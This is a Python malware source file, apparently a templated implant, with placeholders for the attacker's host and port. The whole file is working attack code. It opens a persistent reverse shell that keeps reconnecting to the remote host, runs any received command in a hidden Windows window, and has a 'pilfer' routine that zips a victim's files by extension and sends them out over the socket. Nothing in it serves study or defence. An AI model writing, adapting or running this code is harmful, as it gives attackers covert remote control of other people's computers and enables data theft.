# payload.py
# The Heartbeat Soul. Disconnection is not death, but merely a pause.
# Now with the power to harvest.

import os
import sys
import time
import random
import socket
import subprocess
import threading
import shutil
import zipfile
import tempfile

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##

def send_data(sock, data):
    """Sends data with a simple length header."""
    try:
        sock.sendall(str(len(data)).encode().zfill(16) + data)
    except:
        pass

def pilfer_files(sock, params):
    """
    Finds files, zips them, sends them, and cleans up.
    Format: pilfer C:\path\to\dir .ext1,.ext2,*
    """
    try:
        path, extensions_str = params.split(' ', 1)
        extensions = [e.strip() for e in extensions_str.split(',')]
        all_files = "*" in extensions

        # Create a temporary file for the zip archive
        temp_dir = tempfile.gettempdir()
        zip_path = os.path.join(temp_dir, f"harvest_{random.randint(1000, 9999)}.zip")
        
        files_to_harvest = []
        for root, _, files in os.walk(path):
            for file in files:
                if all_files or any(file.endswith(ext) for ext in extensions):
                    file_path = os.path.join(root, file)
                    files_to_harvest.append(file_path)
        
        if not files_to_harvest:
            send_data(sock, b"[INFO] No files found matching criteria. Nothing to send.")
            return

        send_data(sock, f"[INFO] Found {len(files_to_harvest)} files. Compressing...".encode())

        # Create the zip archive
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for file_path in files_to_harvest:
                try:
                    # We store files with a relative path to avoid revealing the victim's full path structure
                    arcname = os.path.relpath(file_path, path)
                    zf.write(file_path, arcname)
                except:
                    # Ignore files that can't be accessed
                    continue
        
        send_data(sock, b"[INFO] Compression complete. Preparing for transfer...")
        
        # Send the file
        with open(zip_path, 'rb') as f:
            file_data = f.read()
        
        # Signal the start of file transfer with a specific header
        file_header = f"FILE_TRANSFER_START:{len(file_data)}:harvest.zip".encode()
        send_data(sock, file_header)
        sock.sendall(file_data) # Send raw file data after the header

        send_data(sock, b"[SUCCESS] File transfer complete.")

    except Exception as e:
        send_data(sock, f"[ERROR] Pilfer failed: {str(e)}".encode())
    finally:
        # Clean up the temporary zip file
        if os.path.exists(zip_path):
            os.remove(zip_path)


def run_conduit():
    """
    The main reverse shell loop. This is the soul's eternal work.
    It will try to connect forever until its master answers.
    """
    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            while True: # Main command loop
                command_header = s_obj.recv(16)
                if not command_header: break
                
                command_len = int(command_header.decode().strip())
                command = s_obj.recv(command_len).decode().strip()

                if command.startswith("pilfer "):
                    pilfer_files(s_obj, command.split(' ', 1)[1])
                else:
                    # Original shell functionality
                    CREATE_NO_WINDOW = 0x08000000
                    proc = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
                    stdout, stderr = proc.communicate()
                    
                    response = stdout + stderr
                    if not response:
                        response = b"[SUCCESS] Command executed with no output."
                    
                    send_data(s_obj, response)

        except Exception:
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()